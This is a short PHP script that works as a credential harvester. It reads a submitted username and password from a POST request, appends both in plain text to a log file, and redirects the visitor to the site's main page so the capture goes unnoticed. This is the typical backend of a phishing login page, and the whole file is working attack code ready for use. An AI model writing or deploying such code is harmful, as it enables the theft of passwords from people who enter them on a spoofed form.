<?php


$log_file_name = 'mylog.log'; // Change to the log file name
	$n = $_POST['name'];
	$p = $_POST['pass'];
 	 $message = "Login name : ".$n."\t" . "password ".$p."\n";
 	 file_put_contents($log_file_name, $message, FILE_APPEND);
 	 header('Location: /'); // redirect back to the main site
?>
